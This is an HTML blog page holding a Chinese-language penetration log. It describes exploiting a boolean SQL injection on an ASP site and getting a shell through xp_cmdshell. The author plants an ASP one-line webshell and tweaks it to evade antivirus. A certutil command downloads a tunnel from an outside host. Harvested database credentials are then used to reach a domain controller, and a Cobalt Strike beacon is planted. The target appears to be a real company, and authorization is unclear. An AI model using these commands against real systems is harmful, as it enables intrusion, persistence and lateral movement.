@@ -1,0 +1,487 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8" >
+    <meta http-equiv="X-UA-Compatible" content="IE=11,IE=10,IE=9,IE=8" >
+    <meta name="baidu-site-verification" content="dIcXMeY8Ya" />
+    
+    <title>由一句“内网见”引发的内网渗透 | 九指哥哥哟</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0" >
+    <meta name="keywords" content="Jelon, 前端, Web, 张德龙, 前端开发" >
+    <meta name="description" content="Jelon个人前端小站" >
+
+    
+    <link rel="alternative" href="/atom.xml" title="九指哥哥哟" type="application/atom+xml" >
+    
+    
+    <link rel="shortcut icon" href="/favicon.ico" >
+    
+    <link rel="stylesheet" href="/css/style.css">
+    <!--[if lt IE 9]>
+    <script src="/js/html5.js"></script>
+    <![endif]-->
+    
+<script>
+    var _hmt = _hmt || [];
+    (function() {
+        var hm = document.createElement("script");
+        hm.src = "//hm.baidu.com/hm.js?fd459238242776d173cdc64918fb32f2";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+
+</head>
+
+<body class="home">
+    <!--[if lt IE 9]>
+    <div class="browsehappy">
+        当前网页 <strong>不支持</strong>
+        你正在使用的浏览器. 为了正常的访问, 请 <a href="http://browsehappy.com/" target="_blank" rel="noopener">升级你的浏览器</a>.
+    </div>
+    <![endif]-->
+
+    <!-- 博客头部 -->
+    <header class="header">
+    <section class="container header-main">
+        <div class="logo">
+            <a href="/">
+                <div class="cover">
+                    <span class="name">九指哥哥哟</span>
+                    <span class="description"></span>
+                </div>
+            </a>
+        </div>
+        <div class="dropnav icon-paragraph-justify" id="JELON__btnDropNav"></div>
+        <ul class="menu hidden" id="JELON__menu">
+            
+            <li rel="/2019/04/15/%E7%94%B1%E4%B8%80%E5%8F%A5%E2%80%9C%E5%86%85%E7%BD%91%E8%A7%81%E2%80%9D%E5%BC%95%E5%8F%91%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/index.html" class="item ">
+                <a href="/" title="首页" class="icon-home">&nbsp;首页</a>
+            </li>
+            
+            <li rel="/2019/04/15/%E7%94%B1%E4%B8%80%E5%8F%A5%E2%80%9C%E5%86%85%E7%BD%91%E8%A7%81%E2%80%9D%E5%BC%95%E5%8F%91%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/index.html" class="item ">
+                <a href="/about/" title="关于" class="icon-about">&nbsp;关于</a>
+            </li>
+            
+        </ul>
+        <div class="profile clearfix">
+            <div class="feeds fl">
+                
+                
+                <p class="links">
+                    
+                        <a href="https://github.com/9finger" target="_blank">Github</a>
+                        |
+                    
+                        <a href="https://pages.coding.me" target="_blank">Hosted by Coding Pages</a>
+                        
+                    
+                </p>
+                <p class="sns">
+                    
+                        <a href="http://weibo.com/jangdelong" class="sinaweibo" target="_blank"><b>■</b> 新浪微博</a>
+                    
+                        <a href="https://www.facebook.com/profile.php?id=100011855760219&amp;ref=bookmarks" class="qqweibo" target="_blank"><b>■</b> Facebook</a>
+                    
+                    <a href="javascript: void(0);" target="_blank" rel="noopener" class="wechat">
+                        <b>■</b>
+                        公众号
+                        <span class="popover">
+                            <img src="/img/wechat_mp.jpg" width="120" height="120" alt="我的微信订阅号">
+                            <i class="arrow"></i>
+                        </span>
+                    </a>
+                </p>
+                
+            </div>
+            <div class="avatar fr">
+                <img src="/img/jelon.jpg" alt="avatar" title="Jelon" >
+            </div>
+        </div>
+    </section>
+</header>
+
+
+    <!-- 博客正文 -->
+    <div class="container body clearfix">
+        <section class="content">
+            <div class="content-main widget">
+                <!-- 文章页 -->
+<!-- 文章 -->
+<article class="post article">
+    <header class="text-center">
+        <h3 class="post-title"><span>由一句“内网见”引发的内网渗透</span></h3>
+    </header>
+    <p class="post-meta text-center">
+        Jelon 发表于
+        <time datetime="2019-04-15T04:00:00.000Z">2019-04-15</time>
+    </p>
+    <div class="post-content">
+        <p>师兄在练手的一个站，把主站扔了出来，说了一声内网见。</p>
+<a id="more"></a>
+
+<h2 id="前期信息采集"><a href="#前期信息采集" class="headerlink" title="前期信息采集"></a>前期信息采集</h2><h3 id="whois"><a href="#whois" class="headerlink" title="whois"></a>whois</h3><p>没搜集到什么有用的信息。</p>
+<h3 id="收集目标ip"><a href="#收集目标ip" class="headerlink" title="收集目标ip"></a>收集目标ip</h3><p>尝试ping查看ip。<br><img src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/1.png" alt=""></p>
+<p>出现ip，在浏览器中添加ip+80端口访问试试。<br><img src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/2.png" alt=""><br>能正常访问，真实ip没跑了。</p>
+<h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><p>Nmap扫一波端口，万一有可直接getshell的漏洞呢（例如445，永恒之蓝漏洞）<br><img src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/3.png" alt=""><br>只开了80,443端口<br>IIS7.5,Windows系统，asp语言</p>
+<h3 id="旁站收集"><a href="#旁站收集" class="headerlink" title="旁站收集"></a>旁站收集</h3><p><img src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/4.png" alt=""><br>同ip下没什么旁站了，就开始动手了。</p>
+<h2 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h2><p>随便看了看一些界面，手工检测一下是否存在漏洞。<br><img src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/5.png" alt=""></p>
+<p>有传参，测试一下。<br><img src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/6.png" alt=""><br>单引号’闭合，and 1=1判断，- -注释sql语句后面的字符。<br>返还结果正常。</p>
+<p><img src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/7.png" alt=""><br>and 1=2，返还结果。<br>典型的布尔注入。</p>
+<h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>直接扔sqlmap<br><img src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/8.png" alt=""><br>结果出来了。<br>得到更深一步信息（系统：Windows2008 R2，数据库：SqlServer 2008）。</p>
+<p>查看是否是dba权限（我习惯存在注入第一件事是就是判断是否是dba权限，因为如果是，进程就进了很大一步）。<br><img src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/9.png" alt=""><br>运气真好！</p>
+<h4 id="sql注入-os-shell"><a href="#sql注入-os-shell" class="headerlink" title="sql注入 os-shell"></a>sql注入 os-shell</h4><p>本地执行–os-shell的时候可能是延迟太高了吧，跑着跑着就返还web状态码500。<br>这时候我只能分两步进行了，我在本地返还sql-shell没问题，后来我在vps跑os-shell没问题。</p>
+<p>这时候分两步讲了，我开始只有sql-shell，师兄说dba注入点 无非就三条路，第一 找密码进后台 第二 直接写shell 第三 dump密码链接数据库（开启外联）。</p>
+<p>写shell最直接快捷了，</p>
+<ol>
+<li>创建临时表 </li>
+</ol>
+<pre><code>http://www.xxxx.com/detail.asp?Prod=085500528&apos;;CREATE TABLE tt_tmp (tmp1 varchar(8000));--</code></pre><p>这步也可以在浏览器执行，不过是布尔注入，没有报错注入的回显，就不知道是否完成创表操作，所以我在sql—shell执行，有回显。以下操作同理，在浏览器执行数据库操作的时候只要做好闭合和注释就可以。<br>在sql-shell执行就像对数据库操作一样的语句：</p>
+<pre><code>CREATE TABLE tt_tmp (tmp1 varchar(8000))</code></pre><p><img src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/10.png" alt=""></p>
+<ol start="2">
+<li>开启xp_cmdshell<br>可能是我执行–os-shell的时候已经开启了，只是没有弹shell回来，但是我可以跳过这一步。</li>
+<li>遍历文件夹查询特殊的asp文件（web端显示的文件名），插入表中，获取网站物理路径。</li>
+</ol>
+<pre><code>insert into tt_tmp(tmp1) exec master..xp_cmdshell &apos;for /r d:\ %i in (detail*.aspx) do @echo %i &apos;</code></pre><p>后面这句命令</p>
+<pre><code>for /r d:\ %i in (detail*.aspx) do @echo %i </code></pre><p>在Windows执行的效果是这样的。<br><img src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/11.png" alt=""><br>他会遍历整个文件夹，查找匹配的文件名输出。<br><img src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/12.png" alt=""></p>
+<p>结果出来了，不过这里我犯了一个错误，只是我后来才发现的，因为延迟太高，我没等所有结果都出来，就直接停止，我以为这就是物理路径。导致我后来写shell的时候一直访问不到。</p>
+<ol start="4">
+<li><p>执行xp_cmdshell写一句话木马<br>这步还没进行，我vps的os-shell就弹回来了。</p>
+</li>
+<li><p>os-shell<br>os-shell回来以后，我直接写一句话木马，但是不解析，于是我又执行了一次这条命令。</p>
+</li>
+</ol>
+<pre><code>for /r d:\ %i in (detail*.aspx) do @echo %i </code></pre><p>这时候网站真实的物理路径出来了。<br>d:\XXXXX\</p>
+<p>二话不说，写马。</p>
+<pre><code>echo ^&lt;%eval request(&quot;sb&quot;)%^&gt; &gt;d:\XXXXX\XXXXX.asp</code></pre><p><strong><em>这里有点小建议，当我们执行一些命令的时候可以现在本地尝试，我在这次渗透过程中就犯了这样的错误，我直接将命令执行，提示错误，有的时候我总觉得是那边的问题，其实我本身的命令就已经出错了。这里是重点。</em></strong></p>
+<p>这里的^是因为&gt;在cmd命令不能直接执行需要^注释一下。<br><img src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/13.png" alt=""></p>
+<p>后来师兄说也可以将命令写在””内就可以。</p>
+<pre><code>echo &quot;&lt;%eval request(&quot;sb&quot;)%&gt;&quot; &gt;d:\XXXXX\XXXXXX.asp</code></pre><p>这马一写上就被秒杀了，于是我用了一个大小写混合的马。就免杀了。<del>（这种杀软还真是low，其实我也挺low的。）</del><br><img src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/14.png" alt=""></p>
+<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>一句话木马也上了，os-shell也是最高权限了，这台机器也算拿下了。<br><img src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/15.png" alt=""><br>web渗透算是告一段落了。</p>
+<p>因为其实我也不是很会内网渗透吧，这次算是第一次认真的内网渗透。所以我的思路就是先搭建代理，然后在搞。</p>
+<p><strong><em>虽然我没搞过内网渗透，但是我牢牢记住了大佬的一句话，内网渗透的本质是信息收集。</em></strong></p>
+<h3 id="代理搭建"><a href="#代理搭建" class="headerlink" title="代理搭建"></a>代理搭建</h3><p>本想直接小马的权限上传reGeorg进行代理。小马的权限真是低得可怜。无上传权限，无修改权限。连命令有些都不能执行。<br><img src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/16.png" alt=""></p>
+<p>这时候我脑海浮起了师兄说得那句话：权限至高无上。<br>嘴角45°上扬，泛起了一抹微笑。<del>2333333333333</del><br>我的sql的xp_cmdshell是最高权限。<br>我用一句下载命令将我的代理文件下载到了web中：</p>
+<pre><code>certutil -urlcache -split -f http://xxxxxxx.com/tunnel.aspx d:\XXXXX\tunnel.aspx</code></pre><p><img src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/17.png" alt=""><br>reGeorg+proxychains内网渗透走起！！！</p>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>本来应该先查看系统关于内网的基本信息，但是我在翻找网站配置文件的时候，收获到意外发现。<br><img src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/18.png" alt=""></p>
+<p>两个数据库的账号密码。<del>虽然我也不知道他为什么连两个数据库。</del><br>当前系统的ip是10.1.1.2</p>
+<p>尝试一下连接10.1.1.1数据库。看看能不能连上.<br><img src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/19.png" alt=""></p>
+<p>可以连上，尝试连接过去开启xp_cmdshell,然后查看权限。<br><img src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/20.png" alt=""></p>
+<p><strong>第二台。拿下</strong></p>
+<p>这样就拿下两台了，接下来得开启我漫长的内网渗透之旅了。<br>开始内网的基本信息收集。自己对内网不是很了解，只好找找文章，看看别人的思路了。<br>翻阅很多篇文章，我觉得有篇文章思路很适合现在该目标的渗透测试。</p>
+<p><strong><em>域渗透的思路就是：通过域成员主机，定位出域控制器IP及域管理员账号，利用域成员主机作为跳板，扩大渗透范围，利用域管理员可以登陆域中任何成员主机的特性，定位出域管理员登陆过的主机IP，设法从域成员主机内存中dump出域管理员密码，进而拿下域控制器、渗透整个内网。<br>                                                                    ——摘抄自<a href="https://www.freebuf.com/company-information/172630.html" target="_blank" rel="noopener" title="干货！内网渗透测试之域渗透详解！收藏！">干货！内网渗透测试之域渗透详解！收藏！</a></em></strong></p>
+<h4 id="小小免杀（插曲）"><a href="#小小免杀（插曲）" class="headerlink" title="小小免杀（插曲）"></a>小小免杀（插曲）</h4><p>查看进程的时候发现存在的杀软是ESET杀软，所以尝试过一下免杀。</p>
+<p>我打算上一个Cobalt Strike的shell过去，这样可以更好的进行内网渗透。做个小小的捆绑免杀，<a href="https://www.youtube.com/watch?v=ykwcG7dXrmE" target="_blank" rel="noopener" title="教程">教程</a>是学长分享的。</p>
+<p>本地测试没问题。<br><img src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/24.png" alt=""></p>
+<p>注入到资源管理器进程后，会有一个新的会话产生，关闭putty.exe进程，也不影响控制。<br><img src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/25.png" alt=""></p>
+<p><strong>Cobalt Strike检测结果：</strong></p>
+<p><img src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/29.png" alt=""></p>
+<p>能过杀软的文件检测。</p>
+<p><strong>Cobalt Strike本地杀软检测：</strong><br><img src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/30.png" alt=""><br>会话弹回，无杀软提示。</p>
+<p><img src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/31.png" alt=""><br>翻阅文件夹时，出现杀软提示。</p>
+<p><img src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/32.png" alt=""><br>会话丢失。</p>
+<p>后来学长说msfconsole的shell，可以过该杀软的检测。我便开始继续着手本地复现。<br><a href="https://blog.csdn.net/sufeiboy/article/details/65939342" target="_blank" rel="noopener" title="教程">教程</a></p>
+<p><strong>msfconsole检测结果：</strong><br><img src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/28.png" alt=""><br>依旧能过杀软文件检测。</p>
+<p><strong>msfconsole本地杀软检测：</strong><br><img src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/33.png" alt=""><br>本地运行，直接提示，会话都弹不回来，我都懵逼了。</p>
+<p>这时候，我就只能动用特殊方法了。<del>（一阵操作之后）</del></p>
+<p><img src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/34.png" alt=""><br>ok！ Cobalt Strike的shell弹回来了。</p>
+<h4 id="开始信息搜集"><a href="#开始信息搜集" class="headerlink" title="开始信息搜集"></a>开始信息搜集</h4><p><strong>10.1.1.2</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure>
+<p><img src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/41.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hostname     当前主机名</span><br></pre></td></tr></table></figure>
+<p><img src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/35.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view /domain    当前域</span><br></pre></td></tr></table></figure>
+<p><img src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/36.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure>
+<p>想看一下dns，一般来说（特殊情况除外），dns的地址是域控的ip地址。<br><img src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/37.png" alt=""><br>ping的时候没有出现ip地址。<br><img src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/38.png" alt=""><br><del>其实应该是乱码吧。</del></p>
+<p>在网上找到一个方法可以确定域控ip</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dsquery server</span><br></pre></td></tr></table></figure>
+<p><img src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/39.png" alt=""></p>
+<p>但是在目标上执行不成功。就放弃了。</p>
+<p><strong>10.1.1.1</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure>
+<p><img src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/42.png" alt=""></p>
+<p>出现意外发现。<br><img src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/43.png" alt=""></p>
+<p>竟然是台域控机器。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view /domain    当前域</span><br></pre></td></tr></table></figure>
+<p><img src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/44.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view   #显示当前域或工作组中计算机的列表</span><br></pre></td></tr></table></figure>
+<p><img src="/images/4.15%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/45.png" alt=""><br>自此，内网渗透的一部分已经结束。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
+<li>其实旁站搜集的时候没有做的完全，师兄说这是一个很大的内网，很大的公司，他买下了多个ip段，C段有好几个web也都是他们</li>
+<li>内网部分存在多个域，我拿下的只是其中一个域。</li>
+<li>很多操作尽量做好本地测试以后再进行实际操作，可以减少误解。</li>
+</ol>
+<h1 id="——未完待续——"><a href="#——未完待续——" class="headerlink" title="——未完待续——"></a>——未完待续——</h1>
+    </div>
+    <p class="post-meta">
+        <span class="post-cat">分类：
+            <a class="cat-link" href="/categories/%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/">渗透日志</a>
+        </span>
+        <span class="post-tags">
+            标签：
+            
+    
+        <a href="/tags/%E6%B8%97%E9%80%8F/" title="渗透">渗透</a>
+    
+
+        </span>
+    </p>
+</article>
+<!-- 分享按钮 -->
+
+  <div class="article-share clearfix text-center">
+    <div class="share-area">
+      <span class="share-txt">分享到：</span>
+      <a href="javascript: window.open(' target="_blank" rel="noopener"http://service.weibo.com/share/share.php?url=' + encodeURIComponent(location.href) + '&title=' + document.title + '&language=zh_cn');" class="share-icon weibo"></a>
+      <a href="javascript: alert(' target="_blank" rel="noopener"请复制链接到微信并发送');" class="share-icon wechat"></a>
+      <a href="javascript: window.open(' target="_blank" rel="noopener"http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=' + encodeURIComponent(location.href) + '&title=' + document.title);" class="share-icon qqzone"></a>
+      <a href="javascript: window.open(' target="_blank" rel="noopener"http://connect.qq.com/widget/shareqq/index.html?url=' + encodeURIComponent(location.href) + '&desc=Jelon个人博客&title=' + document.title + '&callback=' + encodeURIComponent(location.href));" class="share-icon qq"></a>
+      <a href="javascript: window.open(' target="_blank" rel="noopener"http://shuo.douban.com/!service/share?href=' + encodeURIComponent(location.href) + '&name=' + document.title + '&text=' + document.title);" class="share-icon douban"></a>
+    </div>
+  </div>
+
+
+<!-- 上一篇/下一篇 -->
+
+<div class="article-nav clearfix">
+    
+    <span class="prev fl">
+        上一篇<br >
+        <a href="/2019/04/16/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+            
+                PHP学习笔记
+            
+        </a>
+    </span>
+    
+
+    
+    <span class="next fr">
+        下一篇<br >
+        <a href="/2019/03/11/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-4/">
+            
+                靶场练习-4
+            
+        </a>
+    </span>
+    
+</div>
+
+<!-- 文章评论 -->
+
+  <script src="/js/comment.js"></script>
+  <div id="comments" class="comment">
+    <!--
+    <div class="sign-bar">
+      GitHub 已登录!
+      <span class="sign-link">登出</span>
+    </div>
+    <section class="box">
+      <div class="com-avatar"><img src="/img/jelon.jpg" alt="avatar"></div>
+      <div class="com-text">
+        <div class="main">
+          <textarea class="text-area-edited show" placeholder="欢迎评论！"></textarea>
+          <div class="text-area-preview"></div>
+        </div>
+        <div class="switch">
+          <div class="switch-item on">编辑</div>
+          <div class="switch-item">预览</div>
+        </div>
+        <div class="button">提交</div>
+      </div>
+    </section>
+    <section class="tips">注：评论支持 markdown 语法！</section>
+    <section class="list-wrap">
+      <ul class="list">
+        <li>
+          <div class="user-avatar">
+            <a href="/">
+              <img src="/img/jelon.jpg" alt="user-avatar">
+            </a>
+          </div>
+          <div class="user-comment">
+            <div class="user-comment-header">
+              <span class="post-name">张德龙</span>
+              <span class="post-time">2017年12月12日</span>
+              <span class="like liked">已赞</span>
+              <span class="like-num">2</span>
+            </div>
+            <div class="user-comment-body">333333</div>
+          </div>
+        </li>
+        <li>
+          <div class="user-avatar">
+            <a href="/">
+              <img src="/img/jelon.jpg" alt="user-avatar">
+            </a>
+          </div>
+          <div class="user-comment">
+            <div class="user-comment-header">
+              <span class="post-name">刘德华</span>
+              <span class="post-time">2017年12月12日</span>
+              <span class="like">点赞</span>
+              <span class="like-num">2</span>
+            </div>
+            <div class="user-comment-body">vvvvv</div>
+          </div>
+        </li>
+      </ul>
+      <div class="page-nav">
+        <a href="javascript: void(0);" target="_blank" rel="noopener" class="item">1</a>
+        <a href="javascript: void(0);" target="_blank" rel="noopener" class="item">2</a>
+        <a href="javascript: void(0);" target="_blank" rel="noopener" class="item current">3</a>
+      </div>
+    </section>
+    -->
+  </div>
+  <script>
+  JELON.Comment({
+    container: 'comments',
+    label: '由一句“内网见”引发的内网渗透' || '2019/04/15/由一句“内网见”引发的内网渗透/',
+    owner: 'your_github_id',
+    repo: 'your_blog_comments',
+    clientId: 'your_client_id',
+    clientSecret: 'your_client_secret'
+  });
+  </script>
+
+
+            </div>
+
+        </section>
+        <!-- 侧栏部分 -->
+<aside class="sidebar">
+    <section class="widget">
+        <h3 class="widget-hd"><strong>文章分类</strong></h3>
+        <!-- 文章分类 -->
+<ul class="widget-bd">
+    
+    <li>
+        <a href="/categories/%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/">渗透日志</a>
+        <span class="badge">(3)</span>
+    </li>
+    
+    <li>
+        <a href="/categories/%E6%AF%94%E8%B5%9B%E6%97%A5%E8%AE%B0/">比赛日记</a>
+        <span class="badge">(2)</span>
+    </li>
+    
+    <li>
+        <a href="/categories/Python/">Python</a>
+        <span class="badge">(3)</span>
+    </li>
+    
+    <li>
+        <a href="/categories/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/">奇技淫巧</a>
+        <span class="badge">(10)</span>
+    </li>
+    
+    <li>
+        <a href="/categories/python/">python</a>
+        <span class="badge">(5)</span>
+    </li>
+    
+    <li>
+        <a href="/categories/PHP/">PHP</a>
+        <span class="badge">(1)</span>
+    </li>
+    
+    <li>
+        <a href="/categories/%E6%B8%97%E9%80%8F/">渗透</a>
+        <span class="badge">(9)</span>
+    </li>
+    
+    <li>
+        <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a>
+        <span class="badge">(1)</span>
+    </li>
+    
+    <li>
+        <a href="/categories/%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/">技术积累</a>
+        <span class="badge">(2)</span>
+    </li>
+    
+    <li>
+        <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
+        <span class="badge">(8)</span>
+    </li>
+    
+</ul>
+    </section>
+
+    
+    <section class="widget">
+        <h3 class="widget-hd"><strong>热门标签</strong></h3>
+        <!-- 文章标签 -->
+<div class="widget-bd tag-wrap">
+  
+    <a class="tag-item" href="/tags/%E6%B8%97%E9%80%8F/" title="渗透">渗透 (16)</a>
+  
+    <a class="tag-item" href="/tags/%E6%AF%94%E8%B5%9B/" title="比赛">比赛 (2)</a>
+  
+    <a class="tag-item" href="/tags/python/" title="python">python (7)</a>
+  
+    <a class="tag-item" href="/tags/EXP%E7%BB%83%E6%89%8B/" title="EXP练手">EXP练手 (1)</a>
+  
+    <a class="tag-item" href="/tags/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/" title="奇技淫巧">奇技淫巧 (7)</a>
+  
+    <a class="tag-item" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" title="内网渗透">内网渗透 (5)</a>
+  
+    <a class="tag-item" href="/tags/PHP/" title="PHP">PHP (1)</a>
+  
+    <a class="tag-item" href="/tags/Python/" title="Python">Python (1)</a>
+  
+    <a class="tag-item" href="/tags/%E7%88%AC%E8%99%AB/" title="爬虫">爬虫 (1)</a>
+  
+    <a class="tag-item" href="/tags/SQL/" title="SQL">SQL (1)</a>
+  
+    <a class="tag-item" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="漏洞复现">漏洞复现 (9)</a>
+  
+    <a class="tag-item" href="/tags/%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/" title="思路总结">思路总结 (2)</a>
+  
+</div>
+    </section>
+    
+
+    
+
+    
+    <!-- 友情链接 -->
+    <section class="widget">
+        <h3 class="widget-hd"><strong>友情链接</strong></h3>
+        <!-- 文章分类 -->
+<ul class="widget-bd">
+    
+        <li>
+            <a href="https://jelon.top" target="_blank" title="Jelon个人前端小站">前端博客小站</a>
+        </li>
+    
+        <li>
+            <a href="https://www.baidu.com" target="_blank" title="百度搜索">百度</a>
+        </li>
+    
+</ul>
+    </section>
+    
+</aside>
+<!-- / 侧栏部分 -->
+    </div>
+
+    <!-- 博客底部 -->
+    <footer class="footer">
+    &copy;
+    
+        2016-2019
+    
+
+    <a href="/">Jelon Loves You</a>
+</footer>
+<div class="back-to-top" id="JELON__backToTop" title="返回顶部">返回顶部</div>
+
+    <!--博客js脚本 -->
+    <!-- 这里放网站js脚本 -->
+<script src="/js/main.js"></script>
+</body>
+</html>
